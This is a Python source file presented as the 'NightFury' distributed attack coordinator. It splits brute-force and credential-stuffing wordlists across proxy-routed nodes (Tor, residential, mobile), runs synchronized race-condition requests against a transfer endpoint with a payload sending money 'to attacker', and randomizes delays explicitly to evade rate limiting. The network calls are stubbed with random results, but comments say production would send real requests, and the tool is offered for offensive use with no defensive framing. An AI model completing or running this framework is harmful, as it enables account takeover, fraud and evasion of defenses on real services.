"""
NightFury Framework - Distributed Attack Coordinator
Multi-node synchronization, load distribution, coordinated timing attacks
"""

import asyncio
import time
import random
import hashlib
from typing import List, Dict, Optional, Callable, Any, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import logging

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Types of distributed attacks."""
    BRUTE_FORCE = "brute_force"
    RACE_CONDITION = "race_condition"
    DOS = "dos"
    CREDENTIAL_STUFFING = "credential_stuffing"
    TIMING_ATTACK = "timing_attack"
    DISTRIBUTED_SCAN = "distributed_scan"


class NodeStatus(Enum):
    """Status of attack nodes."""
    IDLE = "idle"
    READY = "ready"
    ATTACKING = "attacking"
    COMPLETED = "completed"
    FAILED = "failed"


@dataclass
class AttackNode:
    """Represents a single attack node."""
    node_id: str
    proxy: Optional[str] = None
    status: NodeStatus = NodeStatus.IDLE
    requests_sent: int = 0
    successful_requests: int = 0
    failed_requests: int = 0
    last_activity: float = field(default_factory=time.time)
    assigned_tasks: List[Dict] = field(default_factory=list)


@dataclass
class AttackTask:
    """Represents an attack task."""
    task_id: str
    target: str
    attack_type: AttackType
    payload: Dict[str, Any]
    priority: int = 5
    assigned_node: Optional[str] = None
    status: str = "pending"
    result: Optional[Dict] = None
    created_at: float = field(default_factory=time.time)


class DistributedAttackCoordinator:
    """
    Coordinates distributed attacks across multiple nodes.
    Handles load balancing, synchronization, and result aggregation.
    """
    
    def __init__(self, num_nodes: int = 10):
        self.nodes: Dict[str, AttackNode] = {}
        self.tasks: Dict[str, AttackTask] = {}
        self.results: List[Dict] = []
        self.num_nodes = num_nodes
        self.attack_active = False
        self.sync_barrier = None
        
        # Initialize nodes
        self._initialize_nodes()
        
    def _initialize_nodes(self):
        """Initialize attack nodes."""
        for i in range(self.num_nodes):
            node_id = f"node_{i:03d}"
            self.nodes[node_id] = AttackNode(
                node_id=node_id,
                proxy=self._generate_proxy_config(i)
            )
        logger.info(f"[DISTRIBUTED] Initialized {self.num_nodes} attack nodes")
    
    def _generate_proxy_config(self, node_index: int) -> str:
        """Generate proxy configuration for node."""
        # In production, this would return actual proxy addresses
        proxy_providers = ['tor', 'residential', 'datacenter', 'mobile']
        provider = random.choice(proxy_providers)
        return f"{provider}_proxy_{node_index}"
    
    async def coordinate_brute_force(self, target: str, wordlist: List[str],
                                    username: str = None) -> Dict:
        """
        Coordinate distributed brute force attack.
        
        Args:
            target: Target endpoint
            wordlist: List of passwords to try
            username: Username to brute force (if None, brute force usernames too)
            
        Returns:
            Attack results
        """
        logger.info(f"[DISTRIBUTED] Starting brute force on {target}")
        logger.info(f"[DISTRIBUTED] Wordlist size: {len(wordlist)}")
        
        # Distribute wordlist across nodes
        chunk_size = len(wordlist) // self.num_nodes
        tasks = []
        
        for i, node in enumerate(self.nodes.values()):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < self.num_nodes - 1 else len(wordlist)
            chunk = wordlist[start_idx:end_idx]
            
            task = AttackTask(
                task_id=f"bf_{i:03d}",
                target=target,
                attack_type=AttackType.BRUTE_FORCE,
                payload={
                    'username': username,
                    'passwords': chunk,
                    'start_index': start_idx
                },
                assigned_node=node.node_id
            )
            
            self.tasks[task.task_id] = task
            tasks.append(self._execute_brute_force_task(node, task))
        
        # Execute all tasks concurrently
        results = await asyncio.gather(*tasks)
        
        # Aggregate results
        successful_creds = []
        total_attempts = 0
        
        for result in results:
            if result['success']:
                successful_creds.extend(result['credentials'])
            total_attempts += result['attempts']
        
        return {
            'attack_type': 'brute_force',
            'target': target,
            'total_attempts': total_attempts,
            'successful_credentials': successful_creds,
            'success_rate': len(successful_creds) / total_attempts if total_attempts > 0 else 0,
            'duration': sum(r['duration'] for r in results)
        }
    
    async def _execute_brute_force_task(self, node: AttackNode, 
                                       task: AttackTask) -> Dict:
        """Execute brute force task on a node."""
        node.status = NodeStatus.ATTACKING
        start_time = time.time()
        
        successful_creds = []
        attempts = 0
        
        username = task.payload['username'] or 'admin'
        passwords = task.payload['passwords']
        
        for password in passwords:
            attempts += 1
            node.requests_sent += 1
            
            # Simulate authentication attempt
            success = await self._attempt_authentication(
                task.target, username, password, node.proxy
            )
            
            if success:
                successful_creds.append({'username': username, 'password': password})
                node.successful_requests += 1
                logger.info(f"[{node.node_id}] Found valid credentials: {username}:{password}")
            else:
                node.failed_requests += 1
            
            # Rate limiting
            await asyncio.sleep(random.uniform(0.1, 0.5))
        
        node.status = NodeStatus.COMPLETED
        duration = time.time() - start_time
        
        return {
            'node_id': node.node_id,
            'success': len(successful_creds) > 0,
            'credentials': successful_creds,
            'attempts': attempts,
            'duration': duration
        }
    
    async def _attempt_authentication(self, target: str, username: str,
                                     password: str, proxy: str) -> bool:
        """Simulate authentication attempt."""
        # In production, this would make actual HTTP requests
        # For simulation, randomly determine success
        await asyncio.sleep(random.uniform(0.05, 0.2))
        return random.random() > 0.999  # 0.1% success rate
    
    async def coordinate_race_condition(self, target: str, payload: Dict,
                                       concurrent_requests: int = 100,
                                       timing_window_ms: float = 10) -> Dict:
        """
        Coordinate race condition exploitation.
        
        Args:
            target: Target endpoint
            payload: Request payload
            concurrent_requests: Number of concurrent requests
            timing_window_ms: Timing window in milliseconds
            
        Returns:
            Attack results
        """
        logger.info(f"[DISTRIBUTED] Starting race condition attack on {target}")
        logger.info(f"[DISTRIBUTED] Concurrent requests: {concurrent_requests}")
        logger.info(f"[DISTRIBUTED] Timing window: {timing_window_ms}ms")
        
        # Distribute requests across nodes
        requests_per_node = concurrent_requests // self.num_nodes
        
        # Create synchronization barrier
        barrier = asyncio.Barrier(self.num_nodes)
        
        tasks = []
        for node in self.nodes.values():
            task = self._execute_race_condition_attack(
                node, target, payload, requests_per_node, barrier, timing_window_ms
            )
            tasks.append(task)
        
        # Execute synchronized attack
        results = await asyncio.gather(*tasks)
        
        # Analyze results
        successful_exploits = sum(1 for r in results if r['exploited'])
        total_requests = sum(r['requests_sent'] for r in results)
        
        return {
            'attack_type': 'race_condition',
            'target': target,
            'concurrent_requests': concurrent_requests,
            'timing_window_ms': timing_window_ms,
            'successful_exploits': successful_exploits,
            'total_requests': total_requests,
            'exploitation_rate': successful_exploits / self.num_nodes
        }
    
    async def _execute_race_condition_attack(self, node: AttackNode, target: str,
                                            payload: Dict, num_requests: int,
                                            barrier: asyncio.Barrier,
                                            timing_window_ms: float) -> Dict:
        """Execute race condition attack from a node."""
        node.status = NodeStatus.READY
        
        # Wait for all nodes to be ready
        await barrier.wait()
        
        node.status = NodeStatus.ATTACKING
        start_time = time.time()
        
        # Fire all requests simultaneously
        request_tasks = []
        for _ in range(num_requests):
            request_tasks.append(self._send_request(target, payload, node.proxy))
        
        # Execute all requests concurrently
        responses = await asyncio.gather(*request_tasks)
        
        # Analyze responses for race condition exploitation
        exploited = self._analyze_race_condition_responses(responses)
        
        node.status = NodeStatus.COMPLETED
        node.requests_sent += num_requests
        
        if exploited:
            node.successful_requests += 1
            logger.info(f"[{node.node_id}] Successfully exploited race condition")
        
        return {
            'node_id': node.node_id,
            'exploited': exploited,
            'requests_sent': num_requests,
            'duration': time.time() - start_time
        }
    
    async def _send_request(self, target: str, payload: Dict, proxy: str) -> Dict:
        """Send HTTP request."""
        # Simulate HTTP request
        await asyncio.sleep(random.uniform(0.01, 0.05))
        
        return {
            'status_code': random.choice([200, 201, 400, 403, 500]),
            'response_time': random.uniform(0.1, 0.5),
            'data': {'balance': random.randint(0, 10000)}
        }
    
    def _analyze_race_condition_responses(self, responses: List[Dict]) -> bool:
        """Analyze responses to detect race condition exploitation."""
        # Check for inconsistent states or duplicate operations
        balances = [r['data'].get('balance', 0) for r in responses]
        
        # If we see significant variance, race condition might be exploited
        if len(set(balances)) > len(balances) * 0.5:
            return True
        
        return False
    
    async def coordinate_credential_stuffing(self, target: str,
                                            credentials: List[Tuple[str, str]]) -> Dict:
        """
        Coordinate credential stuffing attack.
        
        Args:
            target: Target endpoint
            credentials: List of (username, password) tuples
            
        Returns:
            Attack results
        """
        logger.info(f"[DISTRIBUTED] Starting credential stuffing on {target}")
        logger.info(f"[DISTRIBUTED] Testing {len(credentials)} credential pairs")
        
        # Distribute credentials across nodes
        chunk_size = len(credentials) // self.num_nodes
        tasks = []
        
        for i, node in enumerate(self.nodes.values()):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < self.num_nodes - 1 else len(credentials)
            chunk = credentials[start_idx:end_idx]
            
            task = self._execute_credential_stuffing(node, target, chunk)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        
        # Aggregate results
        valid_credentials = []
        for result in results:
            valid_credentials.extend(result['valid_credentials'])
        
        return {
            'attack_type': 'credential_stuffing',
            'target': target,
            'tested_credentials': len(credentials),
            'valid_credentials': valid_credentials,
            'success_rate': len(valid_credentials) / len(credentials)
        }
    
    async def _execute_credential_stuffing(self, node: AttackNode, target: str,
                                          credentials: List[Tuple[str, str]]) -> Dict:
        """Execute credential stuffing from a node."""
        node.status = NodeStatus.ATTACKING
        valid_credentials = []
        
        for username, password in credentials:
            node.requests_sent += 1
            
            success = await self._attempt_authentication(target, username, password, node.proxy)
            
            if success:
                valid_credentials.append({'username': username, 'password': password})
                node.successful_requests += 1
            else:
                node.failed_requests += 1
            
            # Randomized delay to evade rate limiting
            await asyncio.sleep(random.uniform(0.2, 1.0))
        
        node.status = NodeStatus.COMPLETED
        
        return {
            'node_id': node.node_id,
            'valid_credentials': valid_credentials
        }
    
    async def coordinate_timing_attack(self, target: str, 
                                      test_payloads: List[str]) -> Dict:
        """
        Coordinate timing-based attack for information disclosure.
        
        Args:
            target: Target endpoint
            test_payloads: List of payloads to test
            
        Returns:
            Timing analysis results
        """
        logger.info(f"[DISTRIBUTED] Starting timing attack on {target}")
        
        timing_results = {}
        
        for payload in test_payloads:
            # Send same payload from multiple nodes to get accurate timing
            tasks = []
            for node in list(self.nodes.values())[:5]:  # Use 5 nodes for timing
                task = self._measure_response_time(node, target, payload)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            
            # Calculate average response time
            avg_time = sum(r['response_time'] for r in results) / len(results)
            timing_results[payload] = {
                'average_time': avg_time,
                'measurements': [r['response_time'] for r in results],
                'variance': self._calculate_variance([r['response_time'] for r in results])
            }
        
        # Identify anomalous timing patterns
        anomalies = self._identify_timing_anomalies(timing_results)
        
        return {
            'attack_type': 'timing_attack',
            'target': target,
            'timing_results': timing_results,
            'anomalies': anomalies
        }
    
    async def _measure_response_time(self, node: AttackNode, target: str,
                                    payload: str) -> Dict:
        """Measure response time for a payload."""
        start_time = time.time()
        
        # Simulate request
        await asyncio.sleep(random.uniform(0.1, 0.3))
        
        response_time = time.time() - start_time
        
        return {
            'node_id': node.node_id,
            'payload': payload,
            'response_time': response_time
        }
    
    def _calculate_variance(self, values: List[float]) -> float:
        """Calculate variance of timing measurements."""
        if not values:
            return 0.0
        
        mean = sum(values) / len(values)
        variance = sum((x - mean) ** 2 for x in values) / len(values)
        return variance
    
    def _identify_timing_anomalies(self, timing_results: Dict) -> List[Dict]:
        """Identify timing anomalies that might indicate vulnerabilities."""
        anomalies = []
        
        times = [data['average_time'] for data in timing_results.values()]
        mean_time = sum(times) / len(times)
        
        for payload, data in timing_results.items():
            # If response time is significantly different from mean
            if abs(data['average_time'] - mean_time) > mean_time * 0.3:
                anomalies.append({
                    'payload': payload,
                    'average_time': data['average_time'],
                    'deviation_from_mean': data['average_time'] - mean_time,
                    'significance': 'high' if abs(data['average_time'] - mean_time) > mean_time * 0.5 else 'medium'
                })
        
        return anomalies
    
    def get_node_statistics(self) -> Dict:
        """Get statistics for all nodes."""
        stats = {
            'total_nodes': len(self.nodes),
            'active_nodes': sum(1 for n in self.nodes.values() if n.status == NodeStatus.ATTACKING),
            'total_requests': sum(n.requests_sent for n in self.nodes.values()),
            'successful_requests': sum(n.successful_requests for n in self.nodes.values()),
            'failed_requests': sum(n.failed_requests for n in self.nodes.values()),
            'nodes': []
        }
        
        for node in self.nodes.values():
            stats['nodes'].append({
                'node_id': node.node_id,
                'status': node.status.value,
                'requests_sent': node.requests_sent,
                'successful_requests': node.successful_requests,
                'failed_requests': node.failed_requests,
                'success_rate': node.successful_requests / node.requests_sent if node.requests_sent > 0 else 0
            })
        
        return stats
    
    def reset_nodes(self):
        """Reset all nodes to idle state."""
        for node in self.nodes.values():
            node.status = NodeStatus.IDLE
            node.requests_sent = 0
            node.successful_requests = 0
            node.failed_requests = 0
            node.assigned_tasks = []
        
        logger.info("[DISTRIBUTED] All nodes reset to idle state")


# Testing and demonstration
async def main():
    coordinator = DistributedAttackCoordinator(num_nodes=10)
    
    print("=" * 60)
    print("NightFury Distributed Attack Coordinator - Demonstration")
    print("=" * 60)
    
    # Test brute force
    print("\n[*] Testing distributed brute force...")
    wordlist = [f"password{i}" for i in range(100)]
    bf_result = await coordinator.coordinate_brute_force(
        "https://target.com/login",
        wordlist,
        "admin"
    )
    print(f"    Total attempts: {bf_result['total_attempts']}")
    print(f"    Found credentials: {len(bf_result['successful_credentials'])}")
    
    # Test race condition
    print("\n[*] Testing race condition attack...")
    race_result = await coordinator.coordinate_race_condition(
        "https://target.com/api/transfer",
        {'amount': 100, 'to': 'attacker'},
        concurrent_requests=100
    )
    print(f"    Successful exploits: {race_result['successful_exploits']}")
    print(f"    Exploitation rate: {race_result['exploitation_rate']:.2%}")
    
    # Test timing attack
    print("\n[*] Testing timing attack...")
    test_payloads = ["admin", "user", "test", "root"]
    timing_result = await coordinator.coordinate_timing_attack(
        "https://target.com/api/check_user",
        test_payloads
    )
    print(f"    Anomalies detected: {len(timing_result['anomalies'])}")
    
    # Get statistics
    stats = coordinator.get_node_statistics()
    print(f"\n[*] Node Statistics:")
    print(f"    Total nodes: {stats['total_nodes']}")
    print(f"    Total requests: {stats['total_requests']}")
    print(f"    Success rate: {stats['successful_requests'] / stats['total_requests']:.2%}")
    
    print("\n" + "=" * 60)
    print("[✓] Distributed Attack Coordinator operational")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(main())
